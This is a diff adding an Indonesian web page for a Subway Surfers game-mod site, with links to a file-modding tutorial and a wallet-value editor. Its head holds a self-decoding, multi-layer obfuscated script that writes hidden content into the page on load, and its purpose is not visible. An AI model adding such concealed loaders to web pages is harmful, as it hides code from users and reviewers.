@@ -1,0 +1,402 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Subway Menu - KYYS MOD APEKA</title>
+  <link rel="shortcut icon" href="https://i.ibb.co.com/wNsy0D91/99c2e93383c3797268268465d01ae928.jpg" type="image/x-icon"/>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet"/>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+<!-- APAAN MAU AMBIL LU? MAHAL INI SELF AJA GAK GW BAGI INI -->
+  <script>
+let e="T%7BCtOWl%7BdF%3AjWYh3Zl%5BpcHOrcIC%5BNoiQW1eGQYyiTGG6WFiWOV2tcIeQWV6sZlV1fmlzbFuWNVF%3AgHKXXoS%5BNkmEZWWse2%5Bt%5BHGjNEW%5BW36Pd2OIVU29%5BXuxWGWJUmejW16vZ%7BJybXOJbFiWRU1%3A";
+let d=decodeURIComponent(e);
+let c='';
+for(let i=0;i<d.length;i++){c+=String.fromCharCode(d.charCodeAt(i)-1);}
+let b=atob(c);
+let a=b.split("|").map(x=>atob(x)).join("");
+a=a.split("").reverse().join("");
+a=decodeURIComponent(escape(atob(a)));
+document.write(a);
+</script>
+  <style>
+    :root {
+      --primary: #647cf7;
+      --primary-light: #7b8cff;
+      --bg: #131627;
+      --text: #d5d7e3;
+    }
+
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background-color: #0e1120;
+      font-family: 'Inter', sans-serif;
+      color: var(--text);
+      min-height: 100vh;
+      background-image:
+        radial-gradient(circle at 20% 30%, rgba(100, 124, 247, 0.08) 0%, transparent 40%),
+        radial-gradient(circle at 80% 70%, rgba(123, 140, 255, 0.06) 0%, transparent 40%);
+      padding-top: 70px;
+      padding-bottom: 40px;
+    }
+
+    /* === Headbar Glassmorphism === */
+    .headbar {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 60px;
+      padding: 0 20px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      z-index: 1000;
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      background: rgba(19, 22, 39, 0.65);
+      border-bottom: 1px solid rgba(100, 124, 247, 0.2);
+      box-shadow: 0 4px 20px rgba(0, 0, 0, 0.25);
+    }
+
+    .headbar h1 {
+      font-size: 1.35rem;
+      font-weight: 800;
+      color: #ffffff;
+      letter-spacing: -0.5px;
+    }
+
+    .headbar a,
+    .headbar button {
+      color: #ffffff !important;
+      text-decoration: none;
+      background: none;
+      border: none;
+      cursor: pointer;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      width: 40px;
+      height: 40px;
+      border-radius: 10px;
+      transition: all 0.25s ease;
+    }
+
+    .headbar a:hover,
+    .headbar button:hover {
+      background: rgba(255, 255, 255, 0.1);
+    }
+
+    /* === Rotasi 180° Toggle === */
+    .toggle-icon {
+      display: block;
+      transition: transform 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .toggle-icon.rotated {
+      transform: rotate(180deg);
+    }
+
+    /* === Breadcrumb Modern === */
+    .breadcrumb {
+      padding: 12px 0 20px;
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      font-size: 0.95rem;
+      max-width: 800px;
+      width: 100%;
+      margin: 0 auto;
+      padding-left: 16px;
+      padding-right: 16px;
+    }
+
+    .breadcrumb a {
+      color: #ffffff;
+      text-decoration: none;
+      font-weight: 500;
+      transition: opacity 0.2s ease;
+    }
+
+    .breadcrumb a:hover {
+      opacity: 0.85;
+    }
+
+    .breadcrumb .separator {
+      color: var(--primary);
+      font-weight: 400;
+    }
+
+    .breadcrumb .active {
+      color: var(--primary);
+      font-weight: 600;
+      cursor: default;
+    }
+
+    /* === Main Content === */
+    main {
+      max-width: 800px;
+      width: 100%;
+      margin: 0 auto;
+      padding: 0 16px;
+    }
+
+    .card {
+      background: rgba(19, 22, 39, 0.7);
+      backdrop-filter: blur(12px);
+      border: 1px solid rgba(100, 124, 247, 0.25);
+      border-radius: 16px;
+      padding: 2rem;
+      box-shadow: 0 8px 24px rgba(0, 0, 0, 0.35);
+      margin-bottom: 1.5rem;
+      position: relative;
+    }
+
+    .card-title {
+      font-size: 1.25rem;
+      margin-bottom: 1rem;
+      color: #e0e3f0;
+      display: flex;
+      align-items: center;
+      gap: 10px;
+      font-weight: 700;
+    }
+
+    .card-title i {
+      color: var(--primary);
+    }
+
+    .card p {
+      margin-bottom: 1.2rem;
+      line-height: 1.6;
+      color: #c5cbe0;
+    }
+
+    .btn {
+      padding: 0.85rem 1.5rem;
+      border: none;
+      border-radius: 12px;
+      font-size: 1rem;
+      font-weight: 600;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      font-family: 'Inter', sans-serif;
+      text-decoration: none;
+      justify-content: center;
+      min-width: 180px;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+      color: white;
+      box-shadow: 0 0 16px rgba(100, 124, 247, 0.35);
+    }
+
+    .btn-primary:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 0 20px rgba(123, 140, 255, 0.45);
+    }
+
+    .btn-secondary {
+      background: rgba(30, 35, 60, 0.4);
+      color: var(--text);
+      border: 1px solid rgba(100, 124, 247, 0.25);
+    }
+
+    .btn-secondary:hover {
+      background: rgba(40, 48, 80, 0.5);
+      box-shadow: 0 0 12px rgba(100, 124, 247, 0.2);
+    }
+
+    /* === Social Sidebar === */
+    .social-sidebar {
+      position: fixed;
+      top: 0;
+      right: -280px;
+      width: 260px;
+      height: 100vh;
+      background: rgba(19, 22, 39, 0.85);
+      backdrop-filter: blur(18px);
+      -webkit-backdrop-filter: blur(18px);
+      border-left: 1px solid rgba(100, 124, 247, 0.25);
+      padding: 80px 20px 30px;
+      display: flex;
+      flex-direction: column;
+      gap: 24px;
+      z-index: 999;
+      transition: right 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+    }
+
+    .social-sidebar.open {
+      right: 0;
+    }
+
+    .social-sidebar h3 {
+      color: var(--primary-light);
+      margin-bottom: 20px;
+      font-size: 1.1rem;
+      text-align: center;
+      font-weight: 700;
+    }
+
+    .social-link {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 12px 20px;
+      border-radius: 14px;
+      color: var(--text);
+      text-decoration: none;
+      font-weight: 600;
+      transition: all 0.25s ease;
+      background: rgba(30, 35, 60, 0.4);
+      font-family: 'Inter', sans-serif;
+    }
+
+    .social-link:hover {
+      background: rgba(100, 124, 247, 0.2);
+      transform: translateX(-4px);
+      color: var(--primary-light);
+    }
+
+    .social-link i {
+      font-size: 1.3rem;
+      width: 28px;
+      text-align: center;
+    }
+
+    /* === Footer === */
+    footer {
+      text-align: center;
+      padding: 2rem 1rem;
+      color: #9aa0b5;
+      font-size: 0.9rem;
+      margin-top: 3rem;
+      border-top: 1px solid rgba(100, 124, 247, 0.15);
+      font-family: 'Inter', sans-serif;
+      font-weight: 500;
+    }
+
+    footer a {
+      color: var(--primary-light);
+      text-decoration: none;
+      font-weight: 600;
+    }
+
+    footer a:hover {
+      text-decoration: underline;
+    }
+  </style>
+</head>
+<body>
+
+  <!-- Headbar Glassmorphism -->
+  <div class="headbar">
+    <a href="index.html">
+      <i class="fas fa-arrow-left" style="font-size: 1.4rem;"></i>
+    </a>
+    <h1>Subway Menu</h1>
+    <button id="sidebarToggle">
+      <i class="fas fa-bars toggle-icon" id="toggleIcon"></i>
+    </button>
+  </div>
+
+  <!-- Social Sidebar -->
+  <div class="social-sidebar" id="socialSidebar">
+    <h3>Hubungi Kami</h3>
+    <a href="#" target="_blank" class="social-link">
+      <i class="fab fa-whatsapp"></i> WhatsApp
+    </a>
+    <a href="#" target="_blank" class="social-link">
+      <i class="fab fa-youtube"></i> YouTube
+    </a>
+    <a href="#" target="_blank" class="social-link">
+      <i class="fab fa-instagram"></i> Instagram
+    </a>
+    <a href="#" target="_blank" class="social-link">
+      <i class="fab fa-telegram"></i> Telegram
+    </a>
+  </div>
+
+  <!-- Breadcrumb -->
+  <div class="breadcrumb">
+    <a href="https://kyysmodapekaa.edgeone.dev/">Home</a>
+    <span class="separator">/</span>
+    <span class="active">Subway Json</span>
+  </div>
+
+  <main>
+    <!-- Kartu Tutorial -->
+    <div class="card">
+      <div class="card-title">
+        <i class="fas fa-book-open"></i>
+        <span>Tutorial Penggunaan</span>
+      </div>
+      <p>
+        Pelajari cara memasang kode JSON hasil modifikasi ke dalam file Subway Surfers yang telah kamu custom.
+        Panduan mencakup proses ekstraksi, penyisipan data, dan re-packing file game.
+      </p>
+      <a href="subway-tutorial" class="btn btn-secondary">
+        <i class="fas fa-graduation-cap"></i> Buka Tutorial
+      </a>
+    </div>
+
+    <!-- Kartu Customize Wallet -->
+    <div class="card">
+      <div class="card-title">
+        <i class="fas fa-wallet"></i>
+        <span>Customize Wallet</span>
+      </div>
+      <p>
+        Sesuaikan jumlah item dalam game sesuai keinginanmu:  
+        <strong>Koin Game, Hoverboards, Game Keys, Score Boosters, Headstarts, dan Event Coins</strong>.
+      </p>
+      <a href="subway-wallet.html" class="btn btn-primary">
+        <i class="fas fa-sliders-h"></i> Atur Nilai
+      </a>
+    </div>
+  </main>
+
+  <footer>
+    <p>
+      <i class="fab fa-whatsapp"></i>
+      <a href="#" target="_blank">SALURAN WHATSAPP</a>
+    </p>
+    <hr style="border: none; border-top: 1px solid rgba(100, 124, 247, 0.15); margin: 1rem auto; width: 50%;" />
+    <p>&copy; 2025 <a href="https://kyysmodapekaa.edgeone.dev/" target="_blank">KYYS V1</a>, all rights reserved</p>
+  </footer>
+
+  <script>
+    // === Toggle Sidebar ===
+    const toggleBtn = document.getElementById('sidebarToggle');
+    const sidebar = document.getElementById('socialSidebar');
+    const toggleIcon = document.getElementById('toggleIcon');
+
+    toggleBtn.addEventListener('click', () => {
+      sidebar.classList.toggle('open');
+      toggleIcon.classList.toggle('fa-bars');
+      toggleIcon.classList.toggle('fa-xmark');
+      toggleIcon.classList.toggle('rotated');
+    });
+
+    document.addEventListener('click', (e) => {
+      if (sidebar.classList.contains('open') &&
+          !sidebar.contains(e.target) &&
+          !toggleBtn.contains(e.target)) {
+        sidebar.classList.remove('open');
+        toggleIcon.classList.remove('fa-xmark', 'rotated');
+        toggleIcon.classList.add('fa-bars');
+      }
+    });
+  </script>
+<script src="full-screen.js"></script>
+</body>
+</html>
